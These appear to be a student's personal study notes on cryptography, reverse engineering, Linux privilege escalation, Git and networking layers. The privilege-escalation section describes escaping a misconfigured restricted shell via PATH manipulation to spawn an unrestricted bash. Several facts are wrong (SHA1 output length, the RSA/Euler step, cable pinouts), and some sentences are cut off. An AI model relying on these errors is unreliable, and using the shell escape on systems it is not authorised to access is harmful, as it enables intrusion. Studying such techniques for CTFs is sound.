  * Bruteforce cracks Caesar's encryption, frequency analysis too, even faster.
- Vigenère's encryption : : We use a key, say "HELLOWORLD", and then
  * Encrypt the 1st letter with the wheel that sends A onto H
  * Encrypt the 2nd letter with the wheel that sends A onto E
  * Encrypt the 3rd letter with the wheel that sends A onto L
  * Encrypt the 4th letter with the wheel that sends A onto L
  * Encrypt the 5th letter with the wheel that sends A onto O
  * Encrypt the 6th letter with the wheel that sends A onto W
  * Encrypt the 7th letter with the wheel that sends A onto O
  * Encrypt the 8th letter with the wheel that sends A onto R
  * ...
  * (More complex) statistical methods can be used to try to crack it.
- **Block cyphering ? Pourquoi il y a pas le même nombre de clés que de blocks ?**
- **Modes ?**
- AES : https://cryptohack.org/challenges/aes/-

#### Asymmetric cryptography 

- Asymmetric cryptography is a cryptography paradigm in which each communicant has a public and a private key.
  * Data is encrypted using the recipient's public key.
  * This way, only him can decypher it !
  * (Assuming that the privacy of the private key is ensured).
- Diffie-Hellman is an assymetric cryptography algorithm (exchange protocol)
  * The goal of this protocol is to use an assymetric protocol for generating a common symmetric key. 
  * i.e., we assume that Alice and Bob both have (private key, public key) pairs, 
  * and that they want a way to generate a _common secret_ key to start a communication 
  * based on symmetric cryptography.
  * Let $n \geqslant 2$ and $g$ be a generator of $ \mathbb Z / n \mathbb Z $. 
  * Alice has a private key $a$ and Bob has a private key $b$.
  * Alice sends $A = g^a [N]$. Bob sends $B = g^b [N]$.
  * Alice computes $K_a = B^a [N]$, Bob computes $K_b = A^b [N]$...
  * ... and we then have $ K_a = K_b =: K $ ! 
  * Indeed (this is an easy exercise) : , $ K_a = B^a = g^{ab} = A^b = K_b [N] $
  * They can then use this key to communicate securely.
  * The uncrackability of this protocol relies on the "fact" that the discrete logarithm is hard to compute.
  * If it is, the protocol is very secure. If it's not, it's not. 
  * As always, it has been uncracked for decades, so...
- RSA is the most commonly used cryptography algorithm. It is quite standard. It is used in SSH by default.
  * RSA key generation : 
    + Choose two (very, very large) primes $p$ and $q$
    + Let $n = pq$
    + Thus, $\varphi(n) = (p-1)(q-1)$ where $\varphi$ is Euler' Totient function. 
    + Choose $e$ coprime with $\varphi(n)$
    + Find $d = e^{-1} [\varphi(n)]$ (using Euclid's algorithm)
    + The public key is then $(n,e)$
    + The private key is then $d$.
  * RSA encryption 
    + If Alice wants to send an encrypted message $m$ to Bob.
    + She computes, using Bob's public $(n,e)$ key, $c = m^e [n]$
    + Bob recieves $m^e [n]$ and knows his private key $d = e^{-1} [\varphi(n)]$ 
    + By Euler's theorem, $m^{ed} = m [\varphi(n)]$. This way he can get $m [N]$ !
    + N is called (public) modulus or cryptographic modulus
    + e is called encryption exponent (public exponent)
    + d is called decryption exponent (private exponent)

### Reverse

If you have the code source of a compiled binary file, it is easy to understand what the code is used to. 

Reminder : Compilation chain
- Compiler (gcc, g++) : `.c`, `.cpp`, `.h` -> `.s`
- Assembler (as) : `.s` -> `.o`
- Linker (ld) `.o` -> `.exe`
- CISC Architectires : (x86/Intel, AMD)
- RISC Architectures : (ARM, MIPS, RISC-V)
To train reversing : Crackme challenges.
It is easier on Linux to have these : VirtualBox
- Static approach : using a decompiler (Ghidra,Cutter) to reverse machine code into [source code](...)
- Dynamic : Run the binary with debugger ([gdb](https://www.sourceware.org/gdb/), GNU Project Debugger) to inspect memory, registers and the execusion of the code
- Always start with a static approach
  * Use `file` on an executable file to get th
  * Use `strings` to display all strings located in the executable file. If there is a password hidden it, it can be
  * Note : in reality 
  * Use Ghidra to try to (statically) un
- If the static approach isn't enough, you can use gdb
  * You can mix both approaches : Use gdb, set breakpoints, find a function, and decompile it using a _static_ approach (Ghidra), swtich back to the dynamic
  * More generally you can switch between tools to get more diversified results :)

### Priviledge escalation (PrivEsc)

- Priviledge escalation happens when some user manages to get higher priviledges than what he's supposedly allowed to.
- File permissions : `r` (read), write (`w`), execute (`x`) (`rwx`)
  * The first three correspond to the `file owner`
  * Example : 
    + `rwxrw-r--` : 
    + The file owner can read, write and execute the file
    + People in the same group as the file owner can read and write the file
    + Other people (anyone else) can only read the file.
  * `SUID` (Set User ID) : This allows a user to allow other user groups to execute a file with specific permissions.
    + The `SUID` bit is set if and only if the file permission looks like `**s******`
    + If the owner has `s` as file execution permission (i.e., the `SUID` is set), the **program runs with the permissions of the file's owner**
    + If a file has the `SUID` bit set, people who have 
    + To set the `SUID` bit : `chmod u+s path/to/file`
    + To remove it : `chmod u-s path/to/file`
  * `GUID` (Group User ID)
    + It's the same as `SUID`, but replacing "the file owner's permissions" by "the file's group permissions" (pr)
    + Recall that a file has an owner and a group : `rwxrwxrwx alice devteam`, for instance.
  * There's also the sticky bit (`t`) that can be set on a directory to unallow anyone **to modify or delete files that they do not own**
    + For instance, when the Sticky Bit is set on a directory, you cannot mess with files owned by other users in that directory.
- Restricted shells
  * Running `bash -r` opens a restricted shell in the current environment.
  * In a restricted shell, the user typically can't :
    + Change directory (no `cd`)
    + Change or set environment variable (no `export`)
    + Execute commands using absolute or relative paths : no `/path/to/executable_file` or `./path/to/executable_file`
    + No output redirection : no `>`, `>>`, `<`, or `|`
    + No wildcards such as `*` or `?`
    + No `exec` or `sh` or `bash` (otherwise that'd allow the user to escape the restricted shell)
    + No `set` or `unset`
  * If the restricted shell is misconfigured, it is possible to escape it...!
    + Using `export` : if this command is allowed, it is possible for the user to change environment variables.
    + `export PATH=/any/path:$PATH` will change the `PATH` to its current value, adding `/any/path/` in the beginning.
    + Then, when typing any command, the shell will start by looking into `/any/path/` if a relevant binary file is in it...!
    + This way, you add a file containing `/bin/bash`, and when running it (typing its name anywhere), it'll open a new bash instance, non-restricted !
    + The `export` command allows to set environment variables in the current shell.
    + `export VAR=<value>` sets the environment variable `VAR` to `<value>`. 
    + That's why, when editing the PATH environment variable, add its previous content by adding `:$PATH` at the end !
    + Note that environment variables are only attached to a given shell.
    + This can sound quite unintuitive when you're used to setting the `PATH` environment variable in the Windows settings - not in any Windows PowerShell, as if these applied to the OS (globally).
    + Actually, "changing the Path" in the Windows settings just changes the default environment variables of any shell. As a consequence, for instance, Python will then be able to find `C:\Users\username\AppData\Local\Programs\Python\Python312\python.exe`
- `sudo -l` allows a user to see what people can run with `sudo`. `sudo -ll` displays more information. `sudo -lll` displays even more.

### Hash maps

- Hask maps are non injective functions to the set of finite strings to hashs bit vords.
- The lengths of the hashs depend on the hash map : SHA1 produces 128 bits hash words, SHA256 produces 256 bit words.
- A collision is a couple of distinct entries that output the same hash. By pigeonhole principle, there are necessarily infinitely many.
- A pre-image of some hash $h$, obtained with an entry $x$, is another $y \neq x$ that outputs the same hash $h$ as $x$.
- Their robustness is based on the following fact :
  * They are non revertible in reasonable time. I.e. : the most reasonable way to try to revert it is to bruteforce it, and this takes ages (with the current limits of our technology).
  * In a similar way, the most reasonable way to try to find a collision is to bruteforce it, and this also takes ages (with the current limits of our technology).
- Applications : Passwords should always be stored as hashes ! Moreover, the hash should always be computed on the server !
  * _En effet_, if the hash is computed on the client's side, it's all as if the password was the hash (see it).
- They are used to :
  * **Store passwords**
  * To compute checksums :
    + To identify malwares
    + For SSL certificates
    + To prevent corruption in a file when downloading
- Tools to break hashes include Hashcat or JohnTheRipper

### Steganography

Hiding data into data : changing certain pixels in an image to 

### Network

Wireshark is your friend. 

### OSint

Some information is public, but hidden.

### Other

- Pentesting, IMSI Catcher, ...
- root.me, hackthebox, Cryptohack (for crypto, very pedagogic, more than root.me), Ozint ; practice !
- _Forensic_ is the practice of searching a (typically old) hard drive, trying to get old files that were typically not erased.

## Virtualization 

https://fr.wikipedia.org/wiki/Virtualisation

### Containers and virtual machines

- A virtual machine is a software that simulates a computer. The computer emulates the kernel along with everything else, and the VM makes syscalls everytimes it needs.

### ProxmoxVE

- The local and local-zfs are storages that correspond to the hypervisors. 
- When creating a container, the Proxmox (UI) Network configuration is reset whenever realoading the container.

## Git

### Creating a repo

- Initialize a local repo with `git init`. 
  * **Note :** The repo will then not have any commits. 
  * Start by committing (with commit message "Initial commit", to respect the tradition) to have a commit on the main branch.
  * Don't mess around too much creating new branches without having any commits. :)
- You can also clone a distant repo and commit to it.
  * The repo can be empty, it can have been created from a web UI. This is practice that prevents errors.

### Git branches

- `git branch` or `git branch --list` lists branches.
- `git branch <branchname>` create a branch with name `<branchname>`
- When on branch `branch1`, `git branch -m branch2` renames current branch `branch1` `branch2`.
- `git branch -m branch1 branch2` renames `branch1` `branch2`
- When on any branch _except_ `test`, `git branch -d test` deletes branch test.
  * **Be cautious with this !** 
  * There is no turning back ! And no safety dialog ("There are 491 commits (1600 hours of work) in this branch. Are you sure you want to delete it ?") !
- `git checkout branch` switches to branch `branch`
- `git switch branch` also switches to branch `branch`. 
  * There is no difference with `checkout`, simply, the `checkout` command was too weird (it is indeed!!) so they changed it, by splitting its features into several other subcommands. 
  * Git being already widely spread and used, they kept `checkout` for habit purposes.

### Git merge

- When on branch `main`, `git merge develop` merges `develop` into `main`.

### Git rebase

The act of rebasing means taking a bunch of commits, and _re-basing_ them, i.e.,  _changing their base_.
- `git pull --rebase` will
  * Pull the remote repository into the local repository
  * And rebase your local repository onto the. 
  * i.e., if the local repository has commits `A <- B <- C`
  * and the distant has commits `D <- E`
  * After `git pull --rebase`, the local repository will have commits `D <- E <- A <- B <-`

#### Fast-forwarding

- "Fast-forwarding" means adding a bunch of commits on top of existing ones; typically commits made by other people. 
- _Id est_, typically, if your co-workers, or friends, have done some work, fast-forwarding means getting up do date with their recent changes.
- In particular, `git pull --ff-only` or `git pull --no-ff` (or `git pull --ff`, which is equivalent to `git pull --no-ff`)(yes, that's a bit weird)(but whatever) pull respectively only fast-forward changes, or no fast-forward changes.

### Git remotes

- `git push --force` with force push your repo to the remote. 
  * Be cautious with this ! This will erase the distant repo contents !
- Once the remote is set up, you must set an upstream for every branch in the project. 
  * i.e., linking all branches of the local project to an existing branch in the remote repository.
  * Checkout on the branch you want to link (`git checkout localbranch`)
  * Run `git branch --set-upstream-to=origin/main localbranch`
  * You can then push this branch to its upstream.
  * If it doesn't work, run `git push --set-upstream origin main`. 
  * This commands pushes _and_ sets the upstream to the local branch.
  * Once it worked once (even if you have to `--force` the command), the upstream'll be set (and a simple `git push` will suffice)
  * It'll likely tell you that the remote branch already has commits and that you can't just push like that. If the remote repo is pretty much empty (has no subtantial work that mustn't be deleted), you can clean it (it will delete everything on it) by adding `--force`

### Git credentials

### Git stash

- `git stash list `
- `git stash show `
- `git stash drop `
- `git stash pop `
- `git stash apply`
- `git stash branch`
- `git stash`
- `git stash save `
- `git stash clear`
- `git stash create`
- `git stash store`

#### SSH

- You can use SSH to interact with your remote repo with quite a lot of ease.
- For this, just put your public key in the settings on the website where the GitHub repo is (it could be GitHub (github.com), or git/gitlab/gitea.yourcompany.com, ...).
- Then, if you have writing rights on the repo, you should be able to push.

### Git CICD

#### GitHub Actions

- GitHub Actions allows 
  * Continuous Integration and Continuous Deployment (CI/CD)
  * Build and Test Automation: Automate building, testing, and validating code every time there's a pull request or code push. This ensures the code is stable and passes tests before merging.
  * Automated Deployment: Deploy code to production or staging environments automatically after passing tests. This can be configured for a wide range of environments, including Kubernetes, AWS, Azure, DigitalOcean, or even FTP servers.
  * Multi-Platform Testing: Run tests across different operating systems (Linux, Windows, macOS) or multiple language versions in parallel.
  * Automated Issue Management: Automatically label issues, assign reviewers, or close issues based on specified conditions, helping to keep the project organized.
  * Automatic Pull Request Management: Label, assign, review, or even merge pull requests based on conditions, like passing all tests, minimum reviews met, etc.
  * Code Quality and Security Checks : Linting and Formatting
  * Static Analysis and Security Scanning: Integrate with tools to detect security vulnerabilities (e.g., Snyk, Dependabot) or perform static code analysis.
  * Dependency Management: Monitor dependencies for security vulnerabilities and automate dependency updates with tools like Dependabot or other package managers.
  * Custom Automation Workflows
  * Custom Scripting: You can create custom workflows using shell scripts, Python, Node.js, or other languages to perform any task you can script. For example, handling file generation, content updates, or report generation.
  * Scheduled Workflows: Run workflows on a schedule, such as every day or week, to automate tasks like backup, reporting, or maintenance tasks.
  * Monitoring and Notifications : Automated Notifications: Set up alerts and notifications to be sent to Slack, Microsoft Teams, email, or other services based on specific events (e.g., failed builds, successful deployments, etc.).
  * Metrics and Reporting: Generate reports or trigger notifications based on code metrics, test coverage, or custom health checks.
  * Publishing and Distribution : Publish Packages: Automatically build and publish packages to package registries, including npm, PyPI, Docker Hub, and GitHub’s own package registry.
  * Create Releases: Automate the creation of GitHub releases by tagging a specific commit, adding release notes, and even uploading binaries or assets associated with the release.
  * Infrastructure as Code (IaC) Automation
  * Provisioning and Managing Cloud Resources: Automatically provision infrastructure using IaC tools like Terraform, Pulumi, or AWS CloudFormation.
  * Automate Infrastructure Changes: Validate and apply infrastructure changes directly from pull requests, allowing infrastructure to be managed alongside code.
  * Community and Open Source Management
  * Bot Automations for Open Source Projects: Use bots to manage community contributions, such as assigning issues to contributors, sending automated responses, or handling stale issues.
  * Automated Documentation Updates: Generate and update documentation automatically when code or API changes, keeping docs up-to-date.
  * Data Processing and Analysis : Data Processing Workflows: Run data pipelines or process data files based on repository events. This is useful for data science projects where you want to trigger model training, data cleaning, or data migration on specific events.
  * Report Generation: Automatically generate data reports, visualizations, or other analysis artifacts when new data or code is committed.
  * Cross-Repository Actions and workflows Across Repositories: Trigger actions across multiple repositories. For example, if a change in a shared library repo requires downstream repos to rebuild, GitHub Actions can handle this cascade of workflows

### Git miscellaneous information

- `Your configuration specifies to merge with the ref 'refs/heads/dev-prod' from the remote, 
`but no such ref was fetched.` happens when you try to pull from a branch that doesn't exist. 
- Git credentials : 
  * When using Github, Gitlab or Gitea : if you try to push using HTTP, it should likely ask for your Git(Hub/Lab/Tea) credentials.
  * If you don't have any credientials (on `git.rezel.net` or `gitlab.telecom-paris.fr` for instance : connecting using SSO), you can generate acces tokens from the Settings panel. Then connect using your username (git.[...]/username/repo)
- When git is installed on a given machine, it must have set up a username and a email (that will correspond to the user that'll use Git in this machine). 
  * Set up the email with `git config --global user.email "email@domain.com"`
  * Set up the username with `git config --global user.name "username"`
  * When this is set up, appear as done by you : `Author: William Driot <william.driot@gmail.com>`
  * **You can set up a username and email for a repo only**
    + This is useful for specific projects
    + Just remove the `--global` flag (and execute the commands in the right repo) : `git config user.email "email@domain.com"`, `git config user.name "username"`

## Computer 

### Processors

- Processorts processor instructions that are defined in instruction sets.
- `x86_64` is what runs on most computers sold on the market.
- If you see an installer with `x86_64` in it, it should be executable by your computer.

### Storage types

Storage Drives can be either :
- SSD or HDD
  * This refers to the storage type. 
  * SSD is faster than HDD.
- PCIe or SATA : 
  * This refers to the bus connection standard (≃ protocol, roughly).
  * PCIe is faster than SATA.
Note that, in particular, "SATA SSD" Drives exist. SATA and SSD aren't exclusive.
Fun fact : PCIe SSD is cheaper than SATA SSD !

### Character encoding

#### ASCII

#### UTF-8

#### Unicode

What "is a code point" ? (...)

#### Other ways of encoding / other encoding tables

ANSI ?

Exercise : Find the characters that break the `EditSummary` script (they are it the `Editsummary` file)

#### Building a server

-  The alimentation typically has three cables connected to it :
  * The "24 pins" : it powers the motherboard
  * The "4 pins : it powers the CPU. If the motherboard has (can have) two CPUs, there should be two of these next to eachother. It often reads "CPU".
  * The "... pins" : it must be connected to the GPU.
  * The ends that read "PSU" mean "Power Supply" : This end must be connected to the power supply.
- The motherboard must be connected to several things. Often, it includes :
  * The USB cable : (image)
  * The LEDs : (three things)
  * The power supply
- The cable 

### Other

- se203.telecom-paris.fr

## Computer networking Theory

Note : Wireshark is your friend ! :)
Note 2 : The difference between "Theory" and "Practice" should be the following :
  * Practice is about how to actually set up networking and how to configure the different equippments.
  * Theory is about explaining the nature and role of the underlying concepts, equippment and protocols.

### The OSI Model

The Open Systems Interconnection (OSI) model is a (reference) model from the International Organization for Standardization (**ISO**) that provides a separation of functionalities necessary for computer communications to work properly. The whole Computer Networking system is split into seven different abstraction layers : 
- Layer 1 : Physical layer
- Layer 2 : Data Link layer 
- Layer 3 : Network layer
- Layer 4 : Transport layer
- Layer 5 : Session layer
- Layer 6 : Presentation layer
- Layer 7 : Application layer

#### Layer 1 - Physical layer

- The physical layer is responsible for the transmission and reception of data between a device and a physical transmission medium. It converts the digital bits into electrical, radio, or optical signals. Voltage levels, timing of voltage changes, physical data rates, maximum transmission distances are specified at this layer. 
- **Network Interface Controllers** (NICs, or Network Interface Cards, i.e. computer hardware components that connect a computer to a network : Ethernet ports, Wi-Fi cards, ...) and **Transmission media** (optical fibers, air for radio signals...) are systems that operate on the Physical layer (note : media is the plural of medium). 
- It may also define transmission modes as simplex (only one person speaks, everyone else listens), half duplex (one person speaks at a time ; you can't talk is someone else is already talking, and if no one's talking, you can start talking and everyone will be hearing. Basically the **Talkie-Walkie** way of talking, in a nutshell.), and full duplex (everyone can speak and listen to anyone simultaneously at any given moment). 
- The physical layer also specifies how encoding occurs over a physical signal, such as electrical voltage or a light pulse. For example, a 1 bit might be represented on a copper wire by the transition from a 0-volt to a 5-volt signal, whereas a 0 bit might be represented by the transition from a 5-volt to a 0-volt signal. As a result, common problems occurring at the physical layer are often related to the incorrect media termination, noise scrambling, and Network Interface Controllers (NICs) and hubs that are misconfigured or do not work correctly.

#### Layer 2 - Data Link layer

- The data link layer provides node-to-node data transfer—a link between two directly connected nodes. It detects and possibly corrects errors that may occur in the physical layer. It defines the protocol to establish and terminate a connection between two physically connected devices. It also defines the protocol for flow control between them. It basically operates everything needed for a network to properly function, for end points being able to connect to them and talk on them, and packet redirection between two nodes that are on the same network. 
- **Switches** are devices that operate at the Data Link layer.
- **Ethernet** (and all its variants ; Ethernet II, VLANs, QinQ...) is an (the) ubiquitous protocol that operates at this layer.
- The IEEE divides the data link layer into two sublayers :
- Medium access control (MAC) sublayer, responsible for controlling how devices in a network gain access to a medium and permission to transmit data.
- Logical link control (LLC) sublayer, responsible for identifying and encapsulating network layer protocols, and controls error checking and synchronization.

#### Layer 3 - Network layer

- The network layer provides what's needed to transfer packets from one _point_ to another, connected in different networks. There is a usual semantic distinction between what we call a _point_ and an _end_ :
  * A _network node_ refers to any hardware (or virtual !) device that's able to recieve and/or send data : a computer, a switch, a router, ...
  * Point-to-point transmission means sending a data packet from a network node to another one that's connected on the same network (with eventual switches standing in the midst). No routers are involved.
  * End-to-end transmission means transmitting data packets between two network nodes that are not necessarily on the same network : routers are then involved.
- If the message is too large to be transmitted from one node to another on the data link layer between those nodes, the network may implement message delivery by splitting the message into several fragments at one node, sending the fragments independently, and reassembling the fragments at another node. This is typically done in the IP Protocol. Message delivery at the network layer is not necessarily guaranteed to be reliable; a network layer protocol may provide reliable message delivery, but it does not need to do so.
- **Routers** are uniquitous that operate on the Network layer.
- **Internet Protocol** (IP) is the ubiquitous third-layer protocol.

#### Layer 4 - Transport layer

The protocols of this layer provide end-to-end communication services between applications. Services provided by this layer include :
- Reliability : Resending packets lost during transport due to network congestion and errors, with error detection code, such as a checksum, to check that the data is not corrupted, and verification correct receipt by sending an ACK or NACK message to the sender. Automatic repeat request schemes may be used to retransmit lost or corrupted data.
- Flow control
- Congestion control and avoindance : Congestion control controls traffic entry into a network, so as to avoid congestive collapse by attempting to avoid overwhelming any of the processing or link capabilities of the intermediate nodes. For instance, in can reduce the rate of sending packets. Automatic repeat requests may keep the network in a congested state; this situation can be avoided by adding congestion avoidance to the flow control, like slow start. This keeps the bandwidth consumption at a low level in the beginning of the transmission, or after packet retransmission.
- Multiplexing : Ports are the abstraction that allows to provide multiple endpoints on a single node, in the same way that the name on a postal address is a way of implementing multiplexing to distinguish between different recipients of the same location. Computer applications will each listen for information on their own ports, which enables the use of more than one network service at the same time. Actually, some people say that this is part of the transport layer in the TCP/IP model, but of the session layer in the OSI model.
- Connection-oriented communication :

Some people make a distinction between :
- The transport layer (layer 4) of the OSI model
- The protocols used for the Internet that originated in the development of TCP/IP, referring to them as the Internet Protocol suite or "TCP/IP". Numbered layers are not used in TCP/IP.

**Transmission Control Protocol** (TCP) and **User Datagram Procotol** (UDP) are the best-known transport protocol of the Internet protocol suite. 

TCP is for connection-oriented transmissions, whereas UDP is connexionless (Fire And Forget) and used for simpler messaging transmissions.

TCP is more complex since it implements reliable transmission, package recovery (resending), ... . Together, TCP and UDP comprise essentially all traffic on the Internet and are the only protocols implemented in every major operating system. Additional transport layer protocols that have been defined and implemented include the Datagram Congestion Control Protocol (DCCP) and the Stream Control Transmission Protocol (SCTP).

#### Layer 5 - Session layer

The session layer provides the mechanism for opening, closing and managing a session between end-user application processes, i.e., a semi-permanent dialogue. It implements connection establishment and release, i.e. ability to establish a connection, called a session, and allows orderly release of the connection.

#### Layer 6 - Presentation layer

The presentation layer serves as the data translator for a network. It ensures the information that the application layer of one system sends out is readable by the application layer of another system. 
- On the sending system, it converts data into to standard, transmittable formats.
- On the receiving system, translates, formats, and delivers information (for processing or display).

Encryption and Decryption are typically done at this level too,[9] although it can be done on the application, session, transport, or network layers, each having its own advantages and disadvantages. For example, when logging on to bank account sites the presentation layer will decrypt the data as it is received.

#### Layer 7 - Application layer

The application layer is the top layer, the one that contains most of the human-machine interfaces. Its definition varies between the OSI Model and the Internet Protocol suite. Essentially, the application layer is where everything related to user-facing application occurs.

### Layer 1 networking equippment

#### Optical fibers

- They come in different types :
  * LC/APC, SC/APC, LC/UPC, SC/APC
  * The LC / SC distinction refers to the type of connector - the form-factor of the end of the cable.
    + SC (Subscriber connector) are slightly bigger, and are essentially (supposed to be) plugged on the "user end" (Subscriber)
    + LC (Lucent connector) are slightly smaller. They are (supposed to be) plugged on the service-provider end.
  * The APC/UPC distinction refers to the way the fiber is polished at its end.
    + UPC (Ultra Physical Contact) : the fiber is polished with a **flat** end face.
    + APC (Angled Physical Contact) : the fiber is polished with a **8-degree** angle at the end face.
    + The "Angled" version is supposed to be slightly better, because the 8-degree angle (is supposed to) mittigate the power loss due to reflexion (cf. Snell-Descarte sine law)
  * All of the above are **single-mode** connector
- Monomode/Multimode fibers change the path that.
  * This has nothing to do with wavelengths !
  * You can have monomode fibers that transmit one or several wavelengths.
  * Modes are about paths that light can follow.
  * Monomode means that there's only one path followed my light, multimode means that there are many.
  * Monomode is better that Multimode fibers, actually. Because multimode fibers can cause dispersion. _Bref_, it's less good.

#### Ethernet cables

- "Ethernet cables" are metonymically referred to as such because they typically transport Ethernet packets.
- The more correct term would be "Twisted pair" cable, because the strings are twisted in pairs. 
  * They must be twisted in pairs because otherwise the electromagnetic fields interferes with itself, jamms itself and it doesn't work.
  * There exist non-twisted, called "flat", cables. These are not more than a few meters long.
  * The data is then transferred using tensions (potential differences) between the two strings of each pair (hence, 4 potential differences, one for each pair).
  * There are also power supply strings in these cables.
- Similarly, "Ethernet cables" often have RJ-45 ports on their ends. We often metonymically refer to these as Ethernet ports.
  * RJ-45 ends can be used for ethernet or serial communication (or telephony, but who cares about telephony). According to Dorian, that's pretty much it.
  * Their plastic is often transparent, and we can see eight little strings, that ought to be twisted in pairs (or not, in flat cables).
  * RJ-45 ports can be crossed, non-crossed, rollback...
  * Non-crossed means that the eight little strings are in the same order on both ends : (1,2,3,4,5,6,7,8) -> (2,1,4,3,6,4,8,7)
  * Crossed means that the pairs are crossed : (1,2,3,4,5,6,7,8) -> (2,1,4,3,6,4,8,7)
  * Rollback are the strings are in reverse order : (1,2,3,4,5,6,7,8) -> (8,7,6,5,4,3,2,1)
- Twisted pairs cables have categories, ranging from 3 to 8 (maybe more in the future).
  * Some normalisation (EIA/TIA 568, 1990) started the numerotation at 3 for some (good) reason.
  * Category 3 and 4 are not used anymore, except maybe for telephony or 10base-T Ethernet.
  * Category 5 and more support 1000base-T Ethernet.
- There is a distinction between Fast Ethernet (100BASE-TX, 100BASE-T), Gigabit Ethernet (1000base-T, 100BASE-TX), there is autonegotiation to allow endpoints (NICs) to negotiate a speed... Ask Dorian next-time we see him for more details.

#### DWDM Equippment

- Multiplexers & demultiplexers
  * They do what we expect : multiplex and demultiplex optical colors.
  * They are passive equippments.
  * Recall that, generally, a multiplexer "merges", "combines" several entries into one, while a demultiplexer "demultiplexes", i.e., "untangles", "separates", a "multi-entry" to several "mono-outputs"
- When working with optic fibers, **be cautious** ! **They can blind you** !
- For that reason, attenuators exist. These are little things that you can put onto a fiber end to mittigate the incoming signal. They are used whenever one needs to mittigate an output or input signal.
- OADMs
  * OADM stands for Optical Add-Drop Multiplexer.
  * An OADM has two inputs and two outputs. It replaces the content of one specific given wavelength (color) $\lambda$.
  * Its inputs are one polychromatic input (A), one monochrome input (B) at with wavelength $\lambda$
  * Its outputs are one polychromatic output (C), and one monochrome output (D) with wavelength $\lambda$.
  * The OADM takes the polychromatic input (A), removes the wavelength $\lambda$, and drops it on output (D)
  * and injects the input (B), at the same wavelength, on the output (D), together with rest of the polychromatic signal on a (A) (the signal (A), without its $\lambda$ wavelength)
  * So, in a nutshell, it takes a (polychromatic) signal, and replaces the content on some wavelength (which is fixed and depends on the OADM, it's part of its specs) (with a given input), and it drops it such that you can retrieve this specific wavelength in the input signal.
  * This equippment is passive. 
  * They come with two sides, that are symmetric by definition (the input and output can be switched).
  * For that reason, they are named "West" and "End"
- Multiplexers (WDM - Wavelength Division Multiplexing technology) come in two sorts
  * DWDM stands for Dense Wavelength Division Multiplexing. 
    + It's a technology that allows multiplexing on polychromatic signals with dense wavelength spectrum.
    + This part separates the wavelengths into channels (C44, C45, C46, C47...). These correspond to wavelengths ranges (there is a standard, for the precise corresponding wavelengths, lookup on the net - no one knows these by heart)
  * CWDM stands for Coarse Wavelength Division Multiplexing
    + It's the opposite : it's for multiplexing on polychromatic signals with _coarse_ wavelength spectrum.
    + This part works raw wavelenths : actual values of $\lambda$
- LR Optics means "Long-range optics" : optics for transporting signal over long distances, typically from a city to another.
- SR Optics is the opposite : Short-range optics, for transporting signal typically between two equippments on the same server farm/cluster.

#### Transcievers

- SFP(-/+/28/...) Optical Transceiver Modules are the small metallic things you plug into switches. 
  * SFP means Small Form-factor pluggable.
  * They convert optical signals to electric signals.
  * There exists SFP (1Gb/s), SFP+ (10Gb/s), SFP28 (25Gb/s) and SFP28 50G (50Gb/s).
  * The form factor are the same for all the SFP variants.
  * The first two are quite common, the last are less.
  * Since the latter are much more expensive, they are mostly used un big datacenter and server clusters. 
- There also exists QSFP(-/+/28/...) ports, with require adequate (QSFP(-/+/28/...))
  * All SFP things have a Q- counterpart. The associated are larger. 
  * Q stands for quad : these are merges of four SFP(-/+/28/...) ports.
  * The associated speeds are four time their non-Q counterpart : 4G/s, 40G/s, 100G/s.
  * These are an aggregated version of four of their non-Q counterpart, but better.
  * There exists breakout cables that allow to convert QSFP(-/+/28/...) (resp. 4x SFP(-/+/28/...)) to 4x SFP(-/+/28/...) (resp. QSFP(-/+/28/...))
- There also exists XFP, which is quite rare.
  * It served as a transition between SFP and SFP+.
  * It became outdated as soon as SFP+ existed.
  * But it can still be found sometimes.
- There also exist GBIC transcievers (Gigabit Interface Converter)
- ONT/OLTs

#### Ethernet hubs

- Ethernet hubs are layer-1 devices that have several ethernet ports.
  * Their goal is to redistribute packets, acting as "forks", or "nodes".
  * They can be called Ethernet hubs or active hubs, or network hubs, or repeater hubs, or even multiport repeaters, or simply hubs. 
  * They make several devices act as a single network segment.
  * They have multiple input/output (I/O) ports, in which a signal introduced at any input is repeated in all outputs, except the original input.

### Layer 2 networking theory and equippment 

- Layer 2 networking equippment essentially boils down to swiches and bridges.
  * One could argue, rightly, that some equippment other than a switch or a bridge, is a layer-2 équippment... Whatever.
  * The difference between a switch and a bridge is not so obvious. 
  * Usual
  * A bridge is, essentially, either a virtual switch, or a switch that connects different networks that are on different supports (optical fiber / waves / ethernet cables...)
  * When configuring a switch, it is possible to logically "split" it up into several virtual switch.
  * Your hardware then acts as if it was two switches. But, on the same hardware. -> Software-Defined Networking !
- Switches redirect packets to the right device using their **Forwarding Information Base** (FIB), also known as **forwarding table**, or **MAC table**.
  * It is a dynamic table that maps MAC addresses to ports.
- This mechanism is what distinguishes switches from Ethernet hubs.
- MAC Addresses
  * These are unique identifiers for NICs (Typically, networks cards, _bref_, the peripheral device that's used for network management)
  * They are in 6 bytes (octets), represented in hexadecimal notation separated by colons : `AB:CD:EF:01:23:45`
  * The first half (i.e., the first three octets) of a MAC address is an Organizationally Unique Identifier (OUI)
  * The second half (last three octets) is Network Interface Controller specific (NIC specific). _Bref_, it is network card specific.
  * In the first octet, the least significant bit, LSB, says whether the ethernet frame is Unicast or Multicast.
  * The second second least significant  says whether the MAC address is globally unique or locally administrated.
  * Broadcast emission, is done by setting `FF:FF:FF:FF:FF:FF` as destination MAC address.
  * Obviously, this will be sent to every host _on the same network_.
  * Read the [Wikipedia page on MAC addresses](https://en.wikipedia.org/wiki/MAC_address), it's very interesting !
- There are three frame emission modes :
  * Unicast : One recipient
  * Multicast : Several recipients
  * Broadcast : Everyone is recipient.
  * This are quite general (general notions), not necessarily Layer-2 specific.

### Layer 3 networking equippment

- Layer 3 networking equippment essentially boils down to routers.
- You can separate these into several categories :
  * Routers (actual routers)
  * Layer-3 switches (switches that can perform routing tasks in addition to mere switching)
  * MPSL Routers (see Multi Protocol Label Switching)
  * ...
- An important thing to note is that most router OSs are Unix-based !
  * For instance, the Xiaomi routers we bought at Rezel for our ISP service run OpenWRT,
    + Note : Our very (very) competent people at Rezel qualified the OpenWRT documentation of really not terrible.
    + Dixit them "You can spend a damn lot, lot of time reading the OpenWRT documentation without learning anything"
  * Anyway, this means that are nothing more than Linux machines !
    + For instance, the command `ip route add A via B`, on all Linux distributions, change the device's routing table to set the next hop for the IP range A to the IP B.
    + Note that here A must be an IP address range.
    + Mnemonic : `ip route add default via B` sets `B` as default gateway for the machine.
  * I think that's quite a damn good thing to note. When you see how switches (configuration) work, you can quite quicly see that their OS is NOT Unix-based xD
